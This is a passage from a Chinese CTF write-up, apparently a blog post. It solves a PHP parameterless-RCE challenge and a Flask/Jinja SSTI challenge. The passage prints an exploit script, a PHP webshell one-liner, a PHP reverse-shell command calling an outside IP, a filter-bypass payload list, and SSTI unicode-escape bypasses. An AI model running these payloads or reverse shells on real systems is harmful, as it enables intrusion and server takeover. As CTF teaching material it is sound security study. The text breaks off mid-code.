src="https://pic.imgdb.cn/item/626688a3239250f7c5946bfa.png"></a></p><p>vim是目前运用得最多的Linux编辑器，当用户在编辑文件但意外退出时（如通过SSH连接到服务器时，在用vim编辑文件的过程中可能遇到因为网速不够导致的命令行卡死而意外退出的情况），会在当前目录下生成一个备份文件，文件名格式为：<code>.文件名.swp</code></p><p>先尝试爆破一下目录：</p><p><a href="https://pic.imgdb.cn/item/626688b1239250f7c5948fdc.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626688b1239250f7c5948fdc.png"></a></p><p>发现index.php，输入.index.php.swp即可得到备份文件。针对SWP备份文件，我们可以用“vim-r”命令恢复文件的内容：</p><p><a href="https://pic.imgdb.cn/item/626688be239250f7c594acee.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626688be239250f7c594acee.png"></a></p><p>接着按下esc，输入<code>:wq</code> 即可将其保存为index.php（简单的vim使用命令，如果这些还不熟悉的话，可以先去学习linux的基础命令）。得到网站源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>] = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">sha1</span>(mt_rand)),<span class="number">0</span>,<span class="number">6</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mingling&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;snert&#x27;</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;snert&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>) !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;不对劲！\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>] = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">sha1</span>(mt_rand)),<span class="number">0</span>,<span class="number">6</span>);</span><br><span class="line">    <span class="variable">$snert</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;mingling&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$snert</span>) &gt; <span class="number">70</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|`|&quot;|\ |\.|,|\+|=|-|\\|\/|&gt;|&lt;|\?|\^|\$|\||&amp;|[A-Za-z0-9]/ixm&#x27;</span>,<span class="variable">$snert</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;干啥？小hacker\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$snert</span>))&#123;</span><br><span class="line">        <span class="variable">$headers</span> = <span class="title function_ invoke__">getallheaders</span>();</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$headers</span> <span class="keyword">as</span> <span class="variable">$var</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/as|\||per|openssl|curl|rm |et|bash|post|ls|flag/&#x27;</span>,<span class="variable">$var</span>)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;你能理解我想要过滤什么吗？如果你可以理解的话，那么你应该发现我已经无脑过滤了一切，不是吗？\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$snert</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="审计代码"><a href="#审计代码" class="headerlink" title="审计代码"></a>审计代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>] = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">sha1</span>(mt_rand)),<span class="number">0</span>,<span class="number">6</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现这里将$_SESSION[‘snert’]的值设为一个随机数的md5值的前六位。</p><p>接着需要传入两个POST型参数，一个名为mingling，一个名为snert。接着看这段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;snert&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>) !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;不对劲！\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对传入的参数snert的md5值的前六位进行判断，如果不等于$_SESSION[‘snert’]，就会退出程序，并弹窗提示“不对劲”。这里是一个很常见的md5截断绕过。</p><p>接着审计，发现这里又对我们上传的mingling参数进行了一些判断：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$snert</span>) &gt; <span class="number">70</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|`|&quot;|\ |\.|,|\+|=|-|\\|\/|&gt;|&lt;|\?|\^|\$|\||&amp;|[A-Za-z0-9]/ixm&#x27;</span>,<span class="variable">$snert</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;干啥？小hacker\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$snert</span>))&#123;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$snert</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果<code>mingling</code>的长度大于70或匹配到了一些可疑字符就会退出程序并弹窗提示“干啥，小hacker”，这里对输入的mingling参数进行了大量的过滤。接着else if中要求mingling能够匹配<code>/[^\s\(\)]+?\((?R)?\)/</code>这个正则表达式，且还能多出一个分号。最后将mingling参数放入eval函数中执行。</p><p>首先我们看下这个正则表达式：</p><p><a href="https://pic.imgdb.cn/item/626688cf239250f7c594d5bf.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626688cf239250f7c594d5bf.png"></a></p><p>发现它要求我们输入的内容必须为如下格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a()</span><br><span class="line">a(b())</span><br><span class="line">a(b(c()))</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>可以发现这是很典型的无参数RCE（<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">无参数RCE介绍</a>）</p><h3 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$snert</span>) &gt; <span class="number">70</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\&#x27;|`|&quot;|\ |\.|,|\+|=|-|\\|\/|&gt;|&lt;|\?|\^|\$|\||&amp;|[A-Za-z0-9]/ixm&#x27;</span>,<span class="variable">$snert</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;干啥？小hacker\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里过滤了大量的字符，但是可以直接通过取反进行绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;snert&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>) !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;snert&#x27;</span>])&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;不对劲！\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对输入的snert参数的值进行了检测，直接暴力遍历1-99999999之间的数字，然后找到md5加密后的字符串的前六位与题目所给的六位字符串相同的那个数字即可。</p><p>直接给出EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://web.snert.cn:8003/&#x27;</span></span><br><span class="line">cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;6d566721c135ead420877d4b266b2cdb&#x27;</span>&#125;<span class="comment">#需要设置cookie，否则$_SESSION[&#x27;snert&#x27;]的值随着我们每次get都会改变</span></span><br><span class="line">data = &#123;<span class="string">&#x27;mingling&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;snert&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">req = requests.get(url,cookies=cookies)</span><br><span class="line">ret = re.findall(<span class="string">&#x27;==[a-z0-9]&#123;6&#125;&#x27;</span>,req.text)<span class="comment">#找到形如==f2aeb0的字符串</span></span><br><span class="line"><span class="keyword">match</span> = ret[<span class="number">0</span>][<span class="number">2</span>:<span class="number">8</span>]<span class="comment">#截取==f2aeb0的后六位字符，即f2aeb0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(<span class="built_in">str</span>(s).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()<span class="comment">#返回md5(s)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_snert</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">99999999</span>):</span><br><span class="line">        <span class="keyword">if</span> md5(i)[<span class="number">0</span>:<span class="number">6</span>]  == <span class="built_in">str</span>(s):</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(i)       <span class="comment">#暴力遍历，直到找到符合的i</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">one</span>(<span class="params">s</span>):</span><br><span class="line">    ss = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> s:</span><br><span class="line">        ss += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="number">255</span> - <span class="built_in">ord</span>(each)))[<span class="number">2</span>:].upper()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;[~<span class="subst">&#123;ss&#125;</span>][!%FF](&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_mingling</span>():</span><br><span class="line">    <span class="comment"># a = &#x27;var_dump(getallheaders());&#x27; #可以先利用这种方法找到我们可以利用的headers</span></span><br><span class="line">    a = <span class="string">&#x27;system(end(getallheaders()));&#x27;</span></span><br><span class="line">    aa = a.split(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> aa[:-<span class="number">1</span>]:</span><br><span class="line">        s += one(each)</span><br><span class="line">    s += <span class="string">&quot;)&quot;</span> * (<span class="built_in">len</span>(aa) - <span class="number">1</span>) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    data[<span class="string">&#x27;mingling&#x27;</span>] = get_mingling()</span><br><span class="line">    data[<span class="string">&#x27;snert&#x27;</span>] = get_snert(<span class="keyword">match</span>)</span><br><span class="line">    <span class="comment"># headers = &#123;&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;,&#x27;Upgrade-Insecure-Requests&#x27;:&#x27;php -r \&#x27;$sock=fsockopen(&quot;110.42.234.56&quot;,9200);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);\&#x27;&#x27;&#125;</span></span><br><span class="line">    <span class="comment"># req = requests.post(url,data,)</span></span><br><span class="line">    payload = <span class="string">&#x27;mingling=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(data[<span class="string">&#x27;mingling&#x27;</span>])+<span class="string">&#x27;&amp;&#x27;</span>+<span class="string">&#x27;snert=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(data[<span class="string">&#x27;snert&#x27;</span>])</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>首先我们可以利用<code>var_dump(getallheaders())</code>来查看可以利用的headers有哪些：</p><p><a href="https://pic.imgdb.cn/item/626688de239250f7c594fb28.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626688de239250f7c594fb28.png"></a></p><p>我们发现<code>current(getallheaders())</code>是Host，这个不能修改，<code>next(getallheaders())</code>是user-agent可以修改，<code>end(getallheaders())</code>是Upgrade-Insecure-Requests，也可以修改。这里以<code>Upgrade-Insecure-Requests</code>为例，先拿到我们需要post的参数，也就是利用脚本拿到<code>system(end(getallheaders()));</code>的取反，然后修改<code>Upgrade-Insecure-Requests</code>为我们想要执行的命令。这样就将<code>Upgrade-Insecure-Requests</code>作为了命令执行函数system的参数。可是这里对headers也进行了过滤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">foreach ($headers as $var)&#123;</span><br><span class="line">            if (preg_match(&#x27;/as|\||per|openssl|curl|rm |et|bash|post|ls|flag/&#x27;,$var)) &#123;</span><br><span class="line">                die(&#x27;&lt;script&gt;alert(\&#x27;你能理解我想要过滤什么吗？如果你可以理解的话，那么你应该发现我已经无脑过滤了一切，不是吗？\&#x27;);history.back()&lt;/script&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这里过滤的已经很明显了，是为了防止我们反弹shell，但是这里给放开了php，也就是说我们可以利用php一句话反弹shell。但是其实不需要反弹shell，直接写入webshell也可以。</p><h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>首先利用脚本生成我们想要上传的payload：</p><p><a href="https://pic.imgdb.cn/item/626688ed239250f7c595205b.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626688ed239250f7c595205b.png"></a></p><p>接着我们更改<code>Upgrade-Insecure-Requests</code>为如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> shell.php &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php eval($_POST[shell]);?&gt;&#x27;</span> &gt; shell.php</span><br></pre></td></tr></table></figure><p>这个命令的大致内容：首先创建一个shell.php，然后将一句话木马写入shell.php中。发包之后，进入shell.php的页面：</p><p><a href="https://pic.imgdb.cn/item/626688f9239250f7c59539cb.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626688f9239250f7c59539cb.png"></a></p><p>传入POST参数<code>shell=phpinfo();</code>成功返回phpinfo！接下来蚁剑连接即可在根目录处找到flag。</p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>从过滤中我们可以得知出题人是想要避免我们反弹shell的，但是放开了php，因此我们可以利用php一句话反弹shell的代码来getshell：</p><p>php一句话反弹shell：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;110.42.234.56&quot;,9200);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p>操作与上述类似，得到payload之后，更改<code>Upgrade-Insecure-Requests</code>为这句反弹shell的代码，在发包前，监听起相应服务器的相应端口，然后发包即可成功反弹shell：</p><p><a href="https://pic.imgdb.cn/item/62668908239250f7c5955d72.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668908239250f7c5955d72.png"></a></p><p>需要注意的是，本题的解绝非仅有这两种方法，提出这两种方法本质是想要达到抛砖引玉的目的，大家可以再思考一下，有没有更简单的方法。比如本题中使用的是apache，且访问日志<strong>并未</strong>开启，但是假如开启的话，那么我们是否可以在headers中直接写入一句话木马，然后通过include将apache的访问日志access.log包含进来，从而达到getshell的目的呢？答案是可以的，但是这些需要大家自己去验证。</p><h2 id="difficult-ssti"><a href="#difficult-ssti" class="headerlink" title="difficult_ssti"></a>difficult_ssti</h2><p><strong>题目考察内容</strong>：参数爆破+SSTI+eval函数反弹shell</p><h3 id="获取线索-2"><a href="#获取线索-2" class="headerlink" title="获取线索"></a>获取线索</h3><p>打开环境，提示“告诉你一个秘密，这个网站有个snert路由，快去看看吧”。进入&#x2F;snert，又提示我们传入一个POST型参数：</p><p><a href="https://pic.imgdb.cn/item/62668972239250f7c5964911.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668972239250f7c5964911.png"></a></p><p>但是传入的参数名却并未告诉我们。尝试爆破目录与抓包，也并没有任何有用的线索。那么现在唯一的线索就是找到这个参数的参数名，爆破这个参数有很多种方法，可以利用burp，脚本，或者工具arjun来爆破参数（arjun项目地址<a href="https://github.com/s0md3v/Arjun">https://github.com/s0md3v/Arjun</a>)：</p><p>脚本很好写，随便贴一个吧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node1.snert.cn/snert&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_param</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;your_dict&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            line = line.strip()</span><br><span class="line">            data = &#123;line:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">            req = requests.post(url,data=data)</span><br><span class="line">            time.sleep(<span class="number">0.05</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;一眼顶针，鉴定为假&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;参数为：&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(line))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    get_param()</span><br></pre></td></tr></table></figure><p>脚本中打开的文件是我们的字典文件，网上有很多，这里就不放了。拿到参数名为url，接着我们尝试传递url参数为不同的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当url=1时，提示`一眼顶针，鉴定为真，这是你的url吗： 1`。我们可以发现这里会将我们输入的url参数输出出来。那我们让url=&#123;&#123;1+1&#125;&#125;，提示如下：</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/62668986239250f7c5967974.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668986239250f7c5967974.png"></a></p><p>我们fuzz一下发现这里大概过滤了这些：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%1c&#x27;, &#x27;%1d&#x27;, &#x27;%1f&#x27;, &#x27;%1e&#x27;, &#x27;%20&#x27;, &#x27;%2b&#x27;, &#x27;%2c&#x27;, &#x27;%3c&#x27;, &#x27;%3e,&#x27;.&#x27;, &#x27;[&#x27;, &#x27;]&#x27;, &#x27;&#123;&#123;&#x27;, &#x27;=&#x27;, &#x27;_&#x27;, &#x27;&#x27;&#x27;, &#x27;&quot;&quot;&#x27;, &#x27;\x&#x27;, &#x27;request&#x27;, &#x27;config&#x27;, &#x27;session&#x27;, &#x27;url_for&#x27;, &#x27;g&#x27;,&#x27;get_flashed_messages&#x27;, &#x27;*&#x27;, &#x27;for&#x27;, &#x27;if&#x27;, &#x27;format&#x27;, &#x27;list&#x27;, &#x27;lower&#x27;, &#x27;slice&#x27;,&#x27;striptags&#x27;, &#x27;trim&#x27;,&#x27;xmlattr&#x27;, &#x27;tojson&#x27;, &#x27;set&#x27;, &#x27;=&#x27;, &#x27;chr&#x27;</span><br><span class="line"></span><br><span class="line">其中&#123;&#123;和&quot;&quot;连续就被过滤。关于“&#123;&#123;”，我们可以利用“&#123;%%&#125;”来绕过，在&#123;% %&#125;里面可以执行python命令，只要不报错就可以。比如让`url=&#123;%print(123)%&#125;`，回显如下：</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/62668993239250f7c5969f68.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668993239250f7c5969f68.png"></a></p><p>现在就可以肯定，这里存在SSTI漏洞。利用方式与一般的SSTI是一样的思路，但是需要写在print中进行执行，也就是<code>&#123;%print(我们构造的python链)%&#125;</code>，同时我们还要注意绕过过滤。</p><h3 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h3><p>这里将”.”进行了过滤，我们可以利用的绕过方式：<code>|attr(&quot;__class__&quot;)</code>。这里注意一下，其中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;__builtins__&#x27;]</span><br><span class="line">应当是</span><br><span class="line">|attr(&quot;get&quot;)(&quot;__builtins__&quot;)</span><br><span class="line">而不仅仅是|attr(&quot;__builtins__&quot;)</span><br><span class="line">[&quot;eval&quot;]同理</span><br></pre></td></tr></table></figure><p>接下来还有个问题，下划线该怎么绕过呢？这也是这道题中最难的地方。首先我们不能利用16进制进行绕过了，因为过滤\x，但是相同的思路，我们可不可以利用Unicode编码来绕过呢？比如，我们将__class__换一下这样构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=&#123;%print(&#123;&#125;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;))%&#125;</span><br></pre></td></tr></table></figure><p>回显如下：</p><p><a href="https://pic.imgdb.cn/item/626689a2239250f7c596c157.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626689a2239250f7c596c157.png"></a></p><p>成功注入。那接下来的思路就很简单了，按照我们一般SSTI注入方式进行注入，同时利用|attr(“<strong>unicode编码</strong>“)进行绕过即可。通过报错，我们可以发现，环境使用的是python3.10：</p><p><a href="https://pic.imgdb.cn/item/626689b8239250f7c596f51f.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/626689b8239250f7c596f51f.png"></a></p><p>我们利用python3的注入方式就可以了。在这里，我利用<code>__builtins__</code> 模块来进行执行命令。利用下面的代码可以在自己的python3环境中看看哪些子类中具有<code>__builtins__</code> 模块：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">&#x27;__builtins__&#x27;</span></span><br><span class="line">num = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;&#125;.__class__.__base__.__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(i.__init__.__globals__.keys())</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            <span class="built_in">print</span>(i, num)</span><br><span class="line">    <span 